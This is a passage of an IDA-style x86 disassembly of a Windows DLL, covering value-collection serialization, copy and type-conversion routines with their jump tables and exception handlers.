; ---------------------------------------------------------------------------

loc_6AF37CC7:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		add	esi, 18h	; jumptable 6AF37C08 case 10
		push	esi
		mov	ecx, edi
		call	Ordinal343
		jmp	loc_6AF37DE4
; ---------------------------------------------------------------------------

loc_6AF37CD7:				; CODE XREF: Ordinal300+50j
					; DATA XREF: .text:off_6AF37E0Fo
		push	dword ptr [esi+40h] ; jumptable	6AF37C08 case 11
		lea	ecx, [ebp+arg_4]
		call	sub_6AF378BB
		mov	ecx, [ebp+arg_4]
		test	ecx, ecx
		jnz	short loc_6AF37CF9
		push	offset aCvaluecolle_28 ; "CValueCollection::SaveValue()	: pSerial"...

loc_6AF37CEE:				; CODE XREF: Ordinal300+153j
					; Ordinal300+16Bj ...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF37DBB
; ---------------------------------------------------------------------------

loc_6AF37CF9:				; CODE XREF: Ordinal300+12Fj
		mov	eax, [ecx]
		lea	edx, [ebp+var_14]
		push	edx
		call	dword ptr [eax+20h]
		test	al, al
		jnz	short loc_6AF37D0D
		push	offset aCvaluecolle_29 ; "CValueCollection::SaveValue()	: pSerial"...
		jmp	short loc_6AF37CEE
; ---------------------------------------------------------------------------

loc_6AF37D0D:				; CODE XREF: Ordinal300+14Cj
		push	10h
		lea	eax, [ebp+var_14]
		push	eax
		mov	ecx, edi
		call	Ordinal333
		test	eax, eax
		jnz	short loc_6AF37D25
		push	offset aCvaluecolle_30 ; "CValueCollection::SaveValue()	: Archive"...
		jmp	short loc_6AF37CEE
; ---------------------------------------------------------------------------

loc_6AF37D25:				; CODE XREF: Ordinal300+164j
		mov	ecx, [ebp+arg_4]
		and	[ebp+arg_0], 0
		mov	eax, [ecx]
		lea	edx, [ebp+arg_0]
		push	edx
		call	dword ptr [eax+14h]
		test	al, al
		jnz	short loc_6AF37D40
		push	offset aCvaluecolle_31 ; "CValueCollection::SaveValue()	: pSerial"...
		jmp	short loc_6AF37CEE
; ---------------------------------------------------------------------------

loc_6AF37D40:				; CODE XREF: Ordinal300+17Fj
		lea	ecx, [ebp+var_2C]
		call	Ordinal861
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_2C]
		call	Ordinal870
		test	eax, eax
		jnz	short loc_6AF37D5E
		push	offset aCvaluecolle_32 ; "CValueCollection::SaveValue()	: mem.New"...
		jmp	short loc_6AF37DAD
; ---------------------------------------------------------------------------

loc_6AF37D5E:				; CODE XREF: Ordinal300+19Dj
		mov	eax, [ebp+arg_4]
		and	[ebp+var_1C], 0
		push	ebx
		mov	ebx, [eax]
		mov	esi, eax
		lea	eax, [ebp+var_1C]
		push	eax
		lea	ecx, [ebp+var_2C]
		call	Ordinal236
		push	eax		; Args
		lea	ecx, [ebp+var_2C]
		call	Ordinal865
		push	eax
		mov	ecx, esi
		call	dword ptr [ebx+0Ch]
		test	al, al
		pop	ebx
		jnz	short loc_6AF37D91
		push	offset aCvaluecolle_33 ; "CValueCollection::SaveValue()	: pSerial"...
		jmp	short loc_6AF37DAD
; ---------------------------------------------------------------------------

loc_6AF37D91:				; CODE XREF: Ordinal300+1D0j
		push	[ebp+var_1C]
		lea	ecx, [ebp+var_2C]
		call	Ordinal865
		push	eax
		mov	ecx, edi
		call	Ordinal333
		test	eax, eax
		jnz	short loc_6AF37DC5
		push	offset aCvaluecolle_30 ; "CValueCollection::SaveValue()	: Archive"...

loc_6AF37DAD:				; CODE XREF: Ordinal300+1A4j
					; Ordinal300+1D7j
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_2C]
		call	Ordinal863

loc_6AF37DBB:				; CODE XREF: Ordinal300+13Cj
		lea	ecx, [ebp+arg_4]
		call	sub_6AF37896
		jmp	short loc_6AF37DE8
; ---------------------------------------------------------------------------

loc_6AF37DC5:				; CODE XREF: Ordinal300+1EEj
		lea	ecx, [ebp+var_2C]
		call	Ordinal863
		lea	ecx, [ebp+arg_4]
		call	sub_6AF37896
		jmp	short loc_6AF37DFE
; ---------------------------------------------------------------------------

loc_6AF37DD7:				; CODE XREF: Ordinal300+4Aj
		push	offset aCvaluecolle_34 ; jumptable 6AF37C08 default case
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF37DE4:				; CODE XREF: Ordinal300+64j
					; Ordinal300+77j ...
		test	eax, eax
		jnz	short loc_6AF37DFE

loc_6AF37DE8:				; CODE XREF: Ordinal300+20Bj
		push	offset aCvaluecolle_35 ; "CValueCollection::SaveValue()	: bArchiv"...
		jmp	short loc_6AF37DF4
; ---------------------------------------------------------------------------

loc_6AF37DEF:				; CODE XREF: Ordinal300+26j
					; Ordinal300+3Dj
		push	offset aCvaluecolle_30 ; "CValueCollection::SaveValue()	: Archive"...

loc_6AF37DF4:				; CODE XREF: Ordinal300+235j
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_15], 0

loc_6AF37DFE:				; CODE XREF: Ordinal300+21Dj
					; Ordinal300+22Ej
		mov	ecx, [ebp+var_4]
		mov	al, [ebp+var_15]
		pop	edi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	8
Ordinal300	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
off_6AF37E0F	dd offset loc_6AF37C0F	; DATA XREF: Ordinal300+50r
		dd offset loc_6AF37C21	; jump table for switch	statement
		dd offset loc_6AF37C34
		dd offset loc_6AF37C43
		dd offset loc_6AF37C55
		dd offset loc_6AF37C69
		dd offset loc_6AF37C78
		dd offset loc_6AF37C87
		dd offset loc_6AF37C96
		dd offset loc_6AF37CB5
		dd offset loc_6AF37CC7
		dd offset loc_6AF37CD7
; Exported entry 245.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal245
Ordinal245	proc near		; CODE XREF: Ordinal180+3Ap
					; sub_6AF348C4+Fp ...
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+8], 0
		lea	ecx, [esi+28h]
		mov	dword ptr [esi], offset	off_6AF56B50
		call	Ordinal861
		lea	ecx, [esi+38h]
		call	sub_6AF318C3
		lea	ecx, [esi+3Ch]
		call	sub_6AF318C3
		and	dword ptr [esi+40h], 0
		lea	eax, [esi+18h]
		push	eax		; pvarg
		mov	byte ptr [esi+44h], 0
		call	ds:VariantInit
		mov	ecx, esi
		call	Ordinal250
		mov	eax, esi
		pop	esi
		retn
Ordinal245	endp

; Exported entry 246.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal246
Ordinal246	proc near		; CODE XREF: sub_6AF33C47+22Fp
					; Ordinal180+58p ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF56B50
		call	Ordinal250
		lea	ecx, [esi+40h]
		call	sub_6AF33374
		lea	ecx, [esi+3Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+38h]
		call	sub_6AF3789B
		lea	ecx, [esi+28h]
		pop	esi
		jmp	Ordinal863
Ordinal246	endp

; Exported entry 256.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal256
Ordinal256	proc near		; CODE XREF: Ordinal156+3p
					; Ordinal158+3p ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+10h]
		mov	dword ptr [esi], offset	off_6AF56B54
		mov	byte ptr [esi+8], 0
		mov	byte ptr [esi+9], 1
		call	Ordinal245
		lea	ecx, [esi+58h]
		call	Ordinal1278
		mov	eax, esi
		pop	esi
		retn
Ordinal256	endp

; Exported entry 257.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal257
Ordinal257	proc near		; CODE XREF: Ordinal157+19j
					; Ordinal206+19j ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+58h]
		mov	dword ptr [esi], offset	off_6AF56B54
		call	Ordinal1279
		lea	ecx, [esi+10h]
		pop	esi
		jmp	Ordinal246
Ordinal257	endp

; Exported entry 258.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal258
Ordinal258	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+10h]
		mov	dword ptr [esi], offset	off_6AF56B54
		mov	byte ptr [esi+8], 0
		call	Ordinal245
		lea	ecx, [esi+58h]
		call	Ordinal1278
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal259
		mov	eax, esi
		pop	esi
		retn	4
Ordinal258	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF37F1D(void *, char)
sub_6AF37F1D	proc near		; DATA XREF: .rdata:off_6AF56B50o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal246
		test	[esp+4+arg_0], 1
		jz	short loc_6AF37F33
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF37F33:				; CODE XREF: sub_6AF37F1D+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF37F1D	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF37F39(void *, char)
sub_6AF37F39	proc near		; DATA XREF: .rdata:off_6AF56B54o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal257
		test	[esp+4+arg_0], 1
		jz	short loc_6AF37F4F
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF37F4F:				; CODE XREF: sub_6AF37F39+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF37F39	endp

; Exported entry 301.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal301
Ordinal301	proc near		; CODE XREF: Ordinal163+1C8p
					; Ordinal212+CCp
					; DATA XREF: ...

var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= byte ptr -4Ch
var_2C		= dword	ptr -2Ch
var_25		= byte ptr -25h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		mov	eax, offset unknown_libname_46 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_2C], ecx
		push	offset aCvaluecolle_36 ; "CValueCollection::CopyValue()"
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_14], eax
		mov	[ebp+var_25], 1
		call	Ordinal751
		mov	eax, [ebp+arg_C]
		and	[ebp+var_4], 0
		mov	esi, [ebp+arg_10]
		mov	[esi+8], eax
		dec	eax
		cmp	eax, 0Bh	; switch 12 cases
		mov	byte ptr [ebp+var_4], 1
		ja	loc_6AF3816D	; jumptable 6AF37F9F default case
		jmp	ds:off_6AF381BE[eax*4] ; switch	jump

loc_6AF37FA6:				; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 0
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+60h]
		jmp	loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF37FBA:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 1
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+5Ch]
		jmp	loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF37FCE:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 2
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+58h]
		jmp	loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF37FE2:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 3
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+54h]
		jmp	loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF37FF6:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 4
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+50h]
		jmp	loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF3800A:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 5
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+4Ch]
		jmp	loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF3801E:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		push	[ebp+arg_8]	; jumptable 6AF37F9F case 6
		lea	edi, [esi+38h]
		mov	ecx, edi
		call	sub_6AF31911
		push	[ebp+arg_8]
		mov	ecx, [ebp+arg_0]
		mov	edx, [ecx]
		push	eax
		push	[ebp+arg_4]
		call	dword ptr [edx+40h]
		mov	bl, al
		push	0FFFFFFFFh
		mov	ecx, edi
		mov	[ebp+var_25], bl
		call	sub_6AF3531D
		jmp	loc_6AF38182
; ---------------------------------------------------------------------------

loc_6AF3804D:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	eax, [ebp+arg_8] ; jumptable 6AF37F9F case 7
		shr	eax, 1
		lea	edi, [esi+3Ch]
		push	eax
		mov	ecx, edi
		call	sub_6AF33BA4
		push	[ebp+arg_8]
		mov	ecx, [ebp+arg_0]
		mov	edx, [ecx]
		push	eax
		push	[ebp+arg_4]
		call	dword ptr [edx+38h]
		mov	bl, al
		push	0FFFFFFFFh
		mov	ecx, edi
		mov	[ebp+var_25], bl
		call	sub_6AF376DF
		jmp	loc_6AF38182
; ---------------------------------------------------------------------------

loc_6AF3807F:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		push	[ebp+arg_8]	; jumptable 6AF37F9F case 8
		mov	edi, [ebp+arg_0]
		push	[ebp+arg_8]
		mov	ebx, [edi]
		lea	ecx, [esi+28h]
		call	Ordinal870
		push	eax
		push	[ebp+arg_4]
		mov	ecx, edi
		call	dword ptr [ebx+48h]
		jmp	short loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF3809D:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 9
		mov	eax, [ecx]
		lea	edx, [esi+10h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+64h]
		jmp	short loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF380AE:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 10
		mov	eax, [ecx]
		lea	edx, [esi+18h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+30h]
		jmp	short loc_6AF380CE
; ---------------------------------------------------------------------------

loc_6AF380BF:				; CODE XREF: Ordinal301+4Aj
					; DATA XREF: .text:off_6AF381BEo
		mov	ecx, [ebp+arg_0] ; jumptable 6AF37F9F case 11
		mov	eax, [ecx]
		lea	edx, [esi+40h]
		push	edx
		push	[ebp+arg_4]
		call	dword ptr [eax+2Ch]

loc_6AF380CE:				; CODE XREF: Ordinal301+60j
					; Ordinal301+74j ...
		mov	bl, al
		jmp	loc_6AF38182
; ---------------------------------------------------------------------------

loc_6AF380D5:				; DATA XREF: .rdata:6AF626F0o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3817C
		retn
; ---------------------------------------------------------------------------

loc_6AF38118:				; DATA XREF: .rdata:6AF62700o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_54]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3817C
		retn
; ---------------------------------------------------------------------------

loc_6AF3816D:				; CODE XREF: Ordinal301+44j
		push	offset aCvaluecolle_37 ; jumptable 6AF37F9F default case
		call	sub_6AF3102E
		pop	ecx
		xor	bl, bl
		jmp	short loc_6AF38182
; ---------------------------------------------------------------------------

loc_6AF3817C:				; DATA XREF: Ordinal301+1BDo
					; Ordinal301+212o
		mov	esi, [ebp+arg_10]
		mov	bl, [ebp+var_25]

loc_6AF38182:				; CODE XREF: Ordinal301+F3j
					; Ordinal301+125j ...
		lea	ecx, [ebp+var_4C]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF38190
		xor	bl, bl

loc_6AF38190:				; CODE XREF: Ordinal301+237j
		mov	eax, [ebp+var_2C]
		mov	byte ptr [esi+44h], 1
		lea	ecx, [ebp+var_4C]
		mov	byte ptr [eax+8], 1
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	14h
Ordinal301	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
off_6AF381BE	dd offset loc_6AF37FA6	; DATA XREF: Ordinal301+4Ar
		dd offset loc_6AF37FBA	; jump table for switch	statement
		dd offset loc_6AF37FCE
		dd offset loc_6AF37FE2
		dd offset loc_6AF37FF6
		dd offset loc_6AF3800A
		dd offset loc_6AF3801E
		dd offset loc_6AF3804D
		dd offset loc_6AF3807F
		dd offset loc_6AF3809D
		dd offset loc_6AF380AE
		dd offset loc_6AF380BF

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF381EE(LPCWSTR lpWideCharStr)
sub_6AF381EE	proc near		; CODE XREF: Ordinal255+136p
					; Ordinal765+1Bp

lpWideCharStr	= dword	ptr  4

		push	ebx
		mov	ebx, [esp+4+lpWideCharStr]
		test	ebx, ebx
		push	esi
		push	edi
		mov	edi, ecx
		jz	short loc_6AF38206
		push	ebx		; lpWideCharStr
		call	sub_6AF37689
		pop	ecx
		mov	esi, eax
		jmp	short loc_6AF38208
; ---------------------------------------------------------------------------

loc_6AF38206:				; CODE XREF: sub_6AF381EE+Bj
		xor	esi, esi

loc_6AF38208:				; CODE XREF: sub_6AF381EE+16j
		test	esi, esi
		mov	ecx, edi
		jle	short loc_6AF3822B
		push	esi
		call	sub_6AF31911
		push	0FFFFFFFFh	; cchWideChar
		push	ebx		; lpWideCharStr
		push	esi		; cbMultiByte
		push	eax		; lpMultiByteStr
		call	sub_6AF315AB
		add	esp, 10h
		push	esi
		mov	ecx, edi
		call	sub_6AF3155D
		jmp	short loc_6AF38230
; ---------------------------------------------------------------------------

loc_6AF3822B:				; CODE XREF: sub_6AF381EE+1Ej
		call	sub_6AF317A8

loc_6AF38230:				; CODE XREF: sub_6AF381EE+3Bj
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn	4
sub_6AF381EE	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF38238(LPCSTR lpMultiByteStr)
sub_6AF38238	proc near		; CODE XREF: Ordinal255+100p

lpMultiByteStr	= dword	ptr  4

		push	ebx
		mov	ebx, [esp+4+lpMultiByteStr]
		test	ebx, ebx
		push	esi
		push	edi
		mov	edi, ecx
		jz	short loc_6AF38250
		push	ebx		; lpMultiByteStr
		call	sub_6AF376A5
		pop	ecx
		mov	esi, eax
		jmp	short loc_6AF38252
; ---------------------------------------------------------------------------

loc_6AF38250:				; CODE XREF: sub_6AF38238+Bj
		xor	esi, esi

loc_6AF38252:				; CODE XREF: sub_6AF38238+16j
		test	esi, esi
		mov	ecx, edi
		jle	short loc_6AF38275
		push	esi
		call	sub_6AF33BA4
		push	0FFFFFFFFh	; cbMultiByte
		push	ebx		; lpMultiByteStr
		push	esi		; cchWideChar
		push	eax		; lpWideCharStr
		call	sub_6AF376BF
		add	esp, 10h
		push	esi
		mov	ecx, edi
		call	sub_6AF33456
		jmp	short loc_6AF3827A
; ---------------------------------------------------------------------------

loc_6AF38275:				; CODE XREF: sub_6AF38238+1Ej
		call	sub_6AF33810

loc_6AF3827A:				; CODE XREF: sub_6AF38238+3Bj
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn	4
sub_6AF38238	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF38282	proc near		; CODE XREF: Ordinal248+BEp

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, [edi]
		lea	ecx, [eax-10h]
		sub	esi, 10h
		cmp	ecx, esi
		jz	short loc_6AF382C8
		cmp	dword ptr [esi+0Ch], 0
		jl	short loc_6AF382BD
		mov	edx, [ecx]
		cmp	edx, [esi]
		jnz	short loc_6AF382BD
		push	ebx
		push	ecx
		call	sub_6AF37725
		pop	ecx
		mov	ecx, esi
		mov	ebx, eax
		call	sub_6AF3160D
		add	ebx, 10h
		mov	[edi], ebx
		pop	ebx
		jmp	short loc_6AF382C8
; ---------------------------------------------------------------------------

loc_6AF382BD:				; CODE XREF: sub_6AF38282+1Aj
					; sub_6AF38282+20j
		push	dword ptr [eax-0Ch] ; int
		mov	ecx, edi
		push	eax		; Src
		call	sub_6AF3436F

loc_6AF382C8:				; CODE XREF: sub_6AF38282+14j
					; sub_6AF38282+39j
		mov	eax, edi
		pop	edi
		pop	esi
		retn	4
sub_6AF38282	endp

; Exported entry 255.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal255
Ordinal255	proc near		; CODE XREF: Ordinal252+6p
					; Ordinal253+6p
					; DATA XREF: ...

var_54		= byte ptr -54h
var_34		= dword	ptr -34h
var_30		= qword	ptr -30h
var_25		= byte ptr -25h
Src		= byte ptr -24h
var_1C		= qword	ptr -1Ch
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch

		mov	eax, offset unknown_libname_47 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+var_10], esp
		push	offset aCvalueConvert ;	"CValue::Convert()"
		lea	ecx, [ebp+var_54]
		mov	[ebp+var_14], eax
		mov	[ebp+var_34], esi
		xor	bl, bl
		call	Ordinal751
		mov	eax, [esi+8]
		xor	edx, edx
		lea	ecx, [eax-1]
		cmp	ecx, 0Bh	; switch 12 cases
		mov	[ebp+var_4], edx
		mov	byte ptr [ebp+var_4], 1
		ja	loc_6AF384CA	; jumptable 6AF38316 default case
		jmp	ds:off_6AF3850B[ecx*4] ; switch	jump

loc_6AF3831D:				; DATA XREF: .text:off_6AF3850Bo
		cmp	[ebp+arg_0], 5	; jumptable 6AF38316 case 4
		jmp	loc_6AF384BE
; ---------------------------------------------------------------------------

loc_6AF38326:				; CODE XREF: Ordinal255+47j
					; DATA XREF: .text:off_6AF3850Bo
		cmp	[ebp+arg_0], edx ; jumptable 6AF38316 cases 0-3,5,9
		jle	loc_6AF384CA	; jumptable 6AF38316 default case
		mov	edi, [ebp+arg_0]
		cmp	edi, 4
		jle	short loc_6AF3834A
		cmp	edi, 5
		jz	short loc_6AF38369
		cmp	edi, 6
		jz	short loc_6AF3834A
		cmp	edi, 0Ah
		jnz	loc_6AF384CA	; jumptable 6AF38316 default case

loc_6AF3834A:				; CODE XREF: Ordinal255+66j
					; Ordinal255+70j
		push	eax
		mov	ecx, esi
		call	Ordinal370
		push	edi
		mov	ecx, esi
		mov	edx, eax
		call	Ordinal370
		cmp	eax, edx
		jb	loc_6AF384CA	; jumptable 6AF38316 default case
		jmp	loc_6AF384C0
; ---------------------------------------------------------------------------

loc_6AF38369:				; CODE XREF: Ordinal255+6Bj
		cmp	[ebp+arg_4], 0
		mov	bl, 1
		jnz	loc_6AF384CA	; jumptable 6AF38316 default case
		mov	eax, [esi+14h]
		mov	ecx, [esi+10h]
		mov	dword ptr [ebp+var_30+4], eax
		and	eax, 7FFFFFFFh
		and	dword ptr [ebp+var_30+4], 80000000h
		mov	dword ptr [ebp+var_1C],	ecx
		mov	dword ptr [ebp+var_1C+4], eax
		fild	[ebp+var_1C]
		mov	dword ptr [ebp+var_30],	edx
		fild	[ebp+var_30]
		fchs
		faddp	st(1), st
		fstp	qword ptr [esi+10h]
		jmp	loc_6AF384CA	; jumptable 6AF38316 default case
; ---------------------------------------------------------------------------

loc_6AF383A5:				; CODE XREF: Ordinal255+47j
					; DATA XREF: .text:off_6AF3850Bo
		mov	eax, [ebp+arg_0] ; jumptable 6AF38316 case 6
		sub	eax, 7
		jz	loc_6AF384C0
		dec	eax
		jnz	loc_6AF384CA	; jumptable 6AF38316 default case
		cmp	[ebp+arg_4], 0
		mov	bl, 1
		mov	[ebp+var_25], bl
		jnz	loc_6AF384CA	; jumptable 6AF38316 default case
		lea	edi, [esi+38h]
		push	dword ptr [edi]	; lpMultiByteStr
		lea	ecx, [esi+3Ch]
		call	sub_6AF38238
		mov	ecx, edi
		call	sub_6AF317A8
		jmp	loc_6AF384CA	; jumptable 6AF38316 default case
; ---------------------------------------------------------------------------

loc_6AF383E0:				; CODE XREF: Ordinal255+47j
					; DATA XREF: .text:off_6AF3850Bo
		mov	eax, [ebp+arg_0] ; jumptable 6AF38316 case 7
		sub	eax, 7
		jz	short loc_6AF383EE
		dec	eax
		jmp	loc_6AF384BE
; ---------------------------------------------------------------------------

loc_6AF383EE:				; CODE XREF: Ordinal255+117j
		cmp	[ebp+arg_4], 0
		mov	bl, 1
		mov	[ebp+var_25], bl
		jnz	loc_6AF384CA	; jumptable 6AF38316 default case
		lea	edi, [esi+3Ch]
		push	dword ptr [edi]	; lpWideCharStr
		lea	ecx, [esi+38h]
		call	sub_6AF381EE
		mov	ecx, edi
		call	sub_6AF33810
		jmp	loc_6AF384CA	; jumptable 6AF38316 default case
; ---------------------------------------------------------------------------

loc_6AF38416:				; DATA XREF: .rdata:6AF62758o
		push	13h
		lea	ecx, [ebp+var_54]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_54]
		call	Ordinal762
		mov	ecx, dword ptr [ebp+var_1C+4]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_54]
		call	Ordinal764
		lea	ecx, [ebp+var_54]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF384C4
		retn
; ---------------------------------------------------------------------------

loc_6AF38459:				; DATA XREF: .rdata:6AF62768o
		push	15h
		lea	ecx, [ebp+var_54]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_54]
		call	Ordinal762
		mov	eax, dword ptr [ebp+var_30+4]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_54]
		call	Ordinal764
		lea	ecx, [ebp+var_54]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF384C4
		retn
; ---------------------------------------------------------------------------

loc_6AF384AE:				; CODE XREF: Ordinal255+47j
					; DATA XREF: .text:off_6AF3850Bo
		cmp	[ebp+arg_0], 9	; jumptable 6AF38316 case 8
		jmp	short loc_6AF384BE
; ---------------------------------------------------------------------------

loc_6AF384B4:				; CODE XREF: Ordinal255+47j
					; DATA XREF: .text:off_6AF3850Bo
		cmp	[ebp+arg_0], 0Bh ; jumptable 6AF38316 case 10
		jmp	short loc_6AF384BE
; ---------------------------------------------------------------------------

loc_6AF384BA:				; CODE XREF: Ordinal255+47j
					; DATA XREF: .text:off_6AF3850Bo
		cmp	[ebp+arg_0], 0Ch ; jumptable 6AF38316 case 11

loc_6AF384BE:				; CODE XREF: Ordinal255+52j
